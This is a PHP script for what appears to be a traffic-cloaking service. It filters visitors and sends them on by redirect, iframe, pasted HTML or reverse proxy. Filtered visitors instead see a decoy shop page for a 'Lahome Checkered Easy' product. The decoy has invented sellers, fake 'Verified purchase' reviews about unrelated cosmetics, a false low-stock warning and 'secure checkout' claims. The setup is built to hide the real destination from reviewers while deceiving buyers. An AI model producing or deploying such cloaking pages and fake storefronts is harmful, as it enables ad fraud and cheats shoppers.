<?php
$GLOBALS['_ta_campaign_key'] = 'CAMPAIGN_KEY';
$GLOBALS['_ta_debug_mode'] = false; //To enable debug mode, set to true or load this script with a '?debug_key=9cffdaf69f3ab98ab959bf623951134c' parameter

require 'bootloader.php';
/*require 'detectbot.php';

if(isBot()) {
    http_response_code(403);
    die('Forbidden');
}*/

$campaign_id = 'CAMPAIGN_ID';

$ta = new TALoader($campaign_id);


if ($ta->suppress_response()) {//Do not send any output when hybrid mode is enabled and a visitor is being filtered (after hybrid page was generated)
    exit;
}

$response = $ta->get_response();
$visitor = $ta->get_visitor();

/*
 * Advanced users: uncomment lines below during development to expose variables you may want to use in your custom code:
 */
//print_r($response);
//print_r($visitor);
//exit;
/*
 * Don't forget to re-comment the lines above before sending live traffic
 */

/*
Note: when using hybrid mode, please use one of our built-in functions as your final step when routing your visitors:
    print header_redirect("http://url.com"); //performs a 302 header redirect (or a window.location=xxx in JS)
    print load_fullscreen_iframe("http://url.com"); //Loads a fullscreen iframe of the specified URL
    print paste_html("http://url.com"); //Downloads HTML in specified URL and outputs it to the screen (uses JS to insert the HTML in hybrid mode)
(These functions will automatically output either regular HTML or JS code depending on what the visitor's browser is expecting)
*/

switch ($response['action']) {
    case 'header_redirect':
        print header_redirect($response['url']); //Uses <script>window.location='xxx'</script> when in hybrid mode (required behaviour)
        exit;
    case 'iframe':
        print load_fullscreen_iframe($response['url']);
        exit;
    case 'paste_html':
        $html = $response['output_html'];
        $html = preg_replace("/<!--BASE--/", "<!--BASE-->", $html);
        print paste_html($html);
        exit;
    case 'reverse_proxy':
        print reverse_proxy($response['url'], "tarp_99a1b19d758265ec165d4f277854cc2f/");
        exit;        
    /* Please be VERY CAREFUL if modifying this block: */
    case 'load_hybrid_page':
        $ta->load_hybrid_page();
        break;
    /* ...it is needed for hybrid mode to function correctly */
    default:
        print other_methods($response['url']);
        break;    
}
/*
 * Note: if using the "Remain on Fail URL" action for Filtered Visitors, append your Fail URL's HTML/PHP code after the closing PHP tag below:
 */
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
    <meta name="robots" content="noindex, nofollow" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta content="Lahome" property="og:title" />
    <meta content="Lahome" property="og:description" />
    <meta content="https://anchorwellnessaw.com/" property="og:image" />
    <meta content="https://anchorwellnessaw.com/" property="og:url" />
    <meta content="1000" property="og:image:width" />
    <meta content="1000" property="og:image:height" />
    <!-- ss -->
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet" />
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <!-- ss -->
    <title>Lahome</title>
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
    <link rel="stylesheet"
        href="https://fonts.googleapis.com/css?family=El+Messiri:400,500,600,700|Raleway:100,100i,200,200i,300,300i,400,400i,500,500i,600,700,700i,800,800i,900,900i" />
    <link rel="stylesheet" href="style.css" />
    <!-- <link rel="stylesheet" href="css/stylecheckk.css"> -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css"
        integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
</head>

<body>
    <!-----HEADER---->
    <header id="header"></header>
    <!-----content---->
    <div class="_main_container_content">
        <div class="carousel_wrapper">
            <div class="car__wrap">
                <div class="carousel_wrapper_wr" id="4xxmediaxx4">
                    <img alt="b1" src="images/a1.webp" class="img-fluid">
                </div>
                <div class="details_wrapper dp">
                    <div class="section_wrapper">
                        <a href="/"> Newest </a>
                        <i class="fa fa-angle-right"></i>
                        <a href="/"> Products </a>
                        <i class="fa fa-angle-right"></i>
                        <a href="/">Skin care</a>
                    </div>
                    <div class="seller_data_wrapper">
                        <div class="first_seller_data_section">
                            <div class="seller_name">
                                 ArizoGlow Beauty 
                            </div>
                            <div class="stars_wrapper">
                                <i class="fa fa-star"></i><i class="fa fa-star"></i><i class="fa fa-star"></i><i
                                    class="fa fa-star"></i><i class="fa fa-star"></i>
                            </div>
                        </div>
                        <div class="seller_city_wrapper">
                            New York, New York 
                        </div>
                    </div>
                    <div class="title_product_wrapper 4xxheadlinexx4">
                        Lahome Checkered Easy
                    </div>
                    <div class="sub_title_product_wrapper 4xxbodyxx4"></div>
                    <div class="tickets_wrapper">
                        <div class="ticket gray">
                            <span class="txt_ticket">Certified</span>
                        </div>
                        <div class="ticket gold">
                            <span class="txt_ticket">Top Product</span>
                        </div>
                    </div>
                    <div class="pricing_wrapper">
                        <div class="all_prices_">
                            <div class="price_wrapper">
                                $18.29
                            </div>
                            <div class="save_wrapper">
                                Save 15%
                            </div>
                        </div>
                        <div class="shipping_price_wrapper">
                            +$9.15 Shipping
                        </div>
                    </div>
                    <div class="qty_wrapper">
                        <div class="qty_title">
                            Quantity
                        </div>
                        <div class="qty_input">
                            <i class="fa fa-minus qc"></i>
                            <input type="text" class="in_q qx">
                            <i class="fa fa-plus qb"></i>
                        </div>
                    </div>
                    <div class="tight_inv_wrapper">
                        <div class="bar_wrapper_">
                            <div class="in_bar_prog"></div>
                        </div>
                        <div class="left_wrapper_stock">
                            <div class="left_stock_sec">
                                Only <b>29%</b> items left in stock
                            </div>
                            <div class="right_stock_sec">
                                Tight Inventory
                            </div>
                        </div>
                    </div>
                    <div class="recently_wrapper">
                        <img src="images/sparkles.svg" alt="sparkles" class="mini-icon">
                        <span class="txt_recent">Recently Listed</span>
                    </div>
                    <div class="buttons_wrapper">
                        <div class="buy_wrapper">
                            <a href="/checkout.html" class="buy_btn">Buy It Now</a>
                        </div>
                        <div class="two_btns_wrapper">
                            <div class="white_btn_wrapper">
                                <a href="/" class="cart_btn">Add to Cart</a>
                            </div>
                            <div class="white_btn_wrapper pad">
                                <a href="/" class="offer_btn">Make an Offer</a>
                            </div>
                        </div>
                        <div class="last_btn_wrapper">
                            <div class="last_btn">
                                <a href="/" class="watch_btn">
                                    <i class="fa fa-heart-o"></i>
                                    Watch
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="li_details_wapper">
                        <div class="li_wrap">
                            <span class="bold_gray">Listed: </span>
                            <span class="txt_b">3 days ago</span>
                        </div>
                        <div class="li_wrap">
                            <span class="bold_gray">Views: </span>
                            <span class="txt_b">12</span>
                        </div>
                        <div class="li_wrap">
                            <span class="bold_gray">Watchers: </span>
                            <span class="txt_b">0</span>
                        </div>
                        <div class="li_wrap">
                            <span class="bold_gray">Offers: </span>
                            <span class="txt_b">0</span>
                        </div>
                    </div>
                </div>
                <div class="product__wrapper__all_elements">
                    <div class="container_prod_">
                        <div class="product_wrapper fasr">
                            <span class="desc">About This Listing</span> <i class="fa fa-angle-down"></i>
                        </div>
                        <div class="content_wrapper_prod p1">
                            <div class="line_pro_">
                                <i class="fa fa-thumb-tack"></i>
                                <div class="txt__">
                                    Tips: All goods are authentic, with genuine patents, counterfeit must be
                                    investigated! Customers, please identify our products, counterfeit must be invested!
                                </div>
                            </div>
                            <div class="line_pro_">
                                <i class="fa fa-shipping-fast"></i>
                                <div class="txt__">
                                    Payments via PayPal and Credit Card
                                </div>
                            </div>
                            <div class="line_pro_">
                                <i class="fa fa-paper-plane-o"></i>
                                <div class="txt__">
                                    Fast refund Guaranteed >> Partial or full refund depending on the situation
                                </div>
                            </div>
                            <div class="line_pro_">
                                <i class="fa fa-box-open"></i>
                                <div class="txt__">
                                    Thorough quality inspection conducted on every order, ensuring 100% quality.
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="product_wrapper">
                        <div class="prod_title_ as">
                            <span class="desc">Product Description</span> <i class="fa fa-angle-down"></i>
                        </div>
                        <div class="_content_prod_specs p2">
                            
                        </div>
                    </div>
                    <div class="protection_wrapper_">
                        <div class="left_side_wrapper">
                            <div class="images__container__how__">
                                <img src="images/how.svg" alt="" class="protection__img_element">
                            </div>
                            <div class="talk__protection__">
                                <div class="talk__pro">anchorwellnessaw.com Protection</div>
                                <div class="talk__under">Simple Returns, Secure Transactions, Human Support</div>
                                <div class="az"><a href="/" class="lrnmore">Learn more</a></div>
                            </div>
                        </div>
                        <div class="right_side_wrapper">
                            <div class="images__container__how__">
                                <img src="images/padlock-icon.svg" alt="" class="protection__img_element">
                            </div>
                            <div class="talk__protection__">
                                <div class="talk__pro">Secure Checkout</div>
                                <div class="secure_under">At anchorwellnessaw.com, your safety and security is our priority.
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="product_wp">
                        Product Overviews
                    </div>
                    <div class="lower_productoverview">

                        <div class="wrapp__ov__btn">
                            <div class="wrapper__poduct__over">
                                <div class="img_side__wrapp">
                                    <img src="" alt="" class="ov__img_element">
                                </div>
                                <div class="right_side_wrap_ov">
                                    <div class="link__title">
                                        <a href="/" class="title_product__ov 4xxheadlinexx4">
                                            Lahome Checkered Easy
                                        </a>
                                    </div>
                                    <div class="tciket__wrap__">
                                        <div class="ticket gold ov">
                                            <span class="txt_ticket">Top Product</span>
                                        </div>
                                        <div class="talk_linked_top">
                                            <a href="/" class="link__tkt">#2 in our store</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="browse__btn">
                                <button class="browse__"> Browse 261 options from $18.29</button>
                            </div>
                        </div>
                        <div class="product_review_wrap">
                            <div class="right__side__rev">
                                <span class="pdt__rev">Product Reviews </span>
                                <div class="stars_wrappeeer">
                                    <i class="fa fa-star"></i><i class="fa fa-star"></i><i class="fa fa-star"></i><i
                                        class="fa fa-star"></i><i class="fa fa-star"></i> (259)
                                </div>
                            </div>
                            <div class="left__side__rev">
                                <i class="fa fa-angle-down"></i>
                            </div>
                        </div>
                        <div class="comment__wrapper__">
                            <div class="left_side_wrapper_comment">
                                <div class="img_user_wrapper">
                                    <img src="images/userimg.jpg" alt="" class="user__img__">
                                </div>
                                <div class="name_user_wp">
                                    Katarina N.
                                </div>
                            </div>
                            <div class="right_side__wrapper_comment">
                                <div class="frst_right_cmt_">New Obsession!</div>
                                <div class="scnd_right_cmt_">
                                    <div class="stars_wrapper">
                                        <i class="fa fa-star"></i><i class="fa fa-star"></i><i class="fa fa-star"></i><i
                                            class="fa fa-star"></i><i class="fa fa-star"></i>
                                        <span class="verifiedpurch">Verified purchase</span>
                                    </div>
                                </div>
                                <div class="trd_right_cmt_">Obsessed with OpalBloom's
                                    Luminous Finish Foundation - my skin looks flawless!.</div>
                                <div class="frt_right_cmt_">9 people found this helpful</div>
                            </div>
                        </div>
                        <div class="comment__wrapper__">
                            <div class="left_side_wrapper_comment">
                                <div class="img_user_wrapper">
                                    <img src="images/userimg.jpg" alt="" class="user__img__">
                                </div>
                                <div class="name_user_wp">
                                    Yasuo T.
                                </div>
                            </div>
                            <div class="right_side__wrapper_comment">
                                <div class="frst_right_cmt_">Just buy one already</div>
                                <div class="scnd_right_cmt_">
                                    <div class="stars_wrapper">
                                        <i class="fa fa-star"></i><i class="fa fa-star"></i><i class="fa fa-star"></i><i
                                            class="fa fa-star"></i><i class="fa fa-star"></i>
                                        <span class="verifiedpurch">Verified purchase</span>
                                    </div>
                                </div>
                                <div class="trd_right_cmt_">Can't get enough of OpalBloom's
                                    Opulent Lashes mascara - it's a game-changer!</div>
                                <div class="frt_right_cmt_">5 people found this helpful</div>
                            </div>
                        </div>
                        <div class="comment__wrapper__btn">
                            <div class="com__left_right">
                                <div class="left_side_wrapper_comment">
                                    <div class="img_user_wrapper">
                                        <img src="images/userimg.jpg" alt="" class="user__img__">
                                    </div>
                                    <div class="name_user_wp">
                                        Teemo Y.
                                    </div>
                                </div>
                                <div class="right_side__wrapper_comment">
                                    <div class="frst_right_cmt_">10/10!!!
                                    </div>
                                    <div class="scnd_right_cmt_">
                                        <div class="stars_wrapper">
                                            <i class="fa fa-star"></i><i class="fa fa-star"></i><i
                                                class="fa fa-star"></i><i class="fa fa-star"></i><i
                                                class="fa fa-star"></i>
                                            <span class="verifiedpurch">Verified purchase</span>
                                        </div>
                                    </div>
                                    <div class="trd_right_cmt_">OpalBloom's Enchantress Eyeliner is so smooth and easy
                                        to apply!</div>
                                    <div class="frt_right_cmt_">19 people found this helpful</div>
                                </div>
                            </div>
                            <div class="btn__show__more">
                                <button class="show___more___">Show More</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="details_wrapper dd">
                <div class="section_wrapper">
                    <a href="/"> Newest </a>
                    <i class="fa fa-angle-right"></i>
                    <a href="/"> Products </a>
                    <i class="fa fa-angle-right"></i>
                    <a href="/">Skin care</a>
                </div>
                <div class="seller_data_wrapper">
                    <div class="first_seller_data_section">
                        <div class="seller_name">
                            
                                GeorgiGlam Beauty 
                        </div>
                        <div class="stars_wrapper">
                            <i class="fa fa-star"></i><i class="fa fa-star"></i><i class="fa fa-star"></i><i
                                class="fa fa-star"></i><i class="fa fa-star"></i>
                        </div>
                    </div>
                    <div class="seller_city_wrapper">
                         Los Angeles, California 
                    </div>
                </div>
                <div class="title_product_wrapper 4xxheadlinexx4">
                    Lahome Checkered Easy
                </div>
                <div class="sub_title_product_wrapper 4xxbodyxx4"></div>
                <div class="tickets_wrapper">
                    <div class="ticket gray">
                        <span class="txt_ticket">Certified</span>
                    </div>
                    <div class="ticket gold">
                        <span class="txt_ticket">Top Product</span>
                    </div>
                </div>
                <div class="pricing_wrapper">
                    <div class="all_prices_">
                        <div class="price_wrapper">
                            $18.29
                        </div>
                        <div class="save_wrapper">
                            Save 15%
                        </div>
                    </div>
                    <div class="shipping_price_wrapper">
                        +$9.15 Shipping
                    </div>
                </div>
                <div class="qty_wrapper">
                    <div class="qty_title">
                        Quantity
                    </div>
                    <div class="qty_input">
                        <i class="fa fa-minus ac"></i>
                        <input type="text" class="in_q ax" value="0">
                        <i class="fa fa-plus ab"></i>
                    </div>
                </div>
                <div class="tight_inv_wrapper">
                    <div class="bar_wrapper_">
                        <div class="in_bar_prog"></div>
                    </div>
                    <div class="left_wrapper_stock">
                        <div class="left_stock_sec">
                            Only <b>29%</b> items left in stock
                        </div>
                        <div class="right_stock_sec">
                            Tight Inventory
                        </div>
                    </div>
                </div>
                <div class="recently_wrapper">
                    <img src="images/sparkles.svg" alt="sparkles" class="mini-icon">
                    <span class="txt_recent">Recently Listed</span>
                </div>
                <div class="buttons_wrapper">
                    <div class="buy_wrapper">
                        <a href="/checkout.html" class="buy_btn">Buy It Now</a>
                    </div>
                    <div class="two_btns_wrapper">
                        <div class="white_btn_wrapper">
                            <a href="/" class="cart_btn">Add to Cart</a>
                        </div>
                        <div class="white_btn_wrapper pad">
                            <a href="/" class="offer_btn">Make an Offer</a>
                        </div>
                    </div>
                    <div class="last_btn_wrapper">
                        <div class="last_btn">
                            <a href="/" class="watch_btn">
                                <i class="fa fa-heart-o"></i>
                                Watch
                            </a>
                        </div>
                    </div>
                </div>
                <div class="li_details_wapper">
                    <div class="li_wrap">
                        <span class="bold_gray">Listed: </span>
                        <span class="txt_b">3 days ago</span>
                    </div>
                    <div class="li_wrap">
                        <span class="bold_gray">Views: </span>
                        <span class="txt_b">12</span>
                    </div>
                    <div class="li_wrap">
                        <span class="bold_gray">Watchers: </span>
                        <span class="txt_b">0</span>
                    </div>
                    <div class="li_wrap">
                        <span class="bold_gray">Offers: </span>
                        <span class="txt_b">0</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer id="footer"></footer>
    <script src="js/ls.js"></script>
</body>

</html>
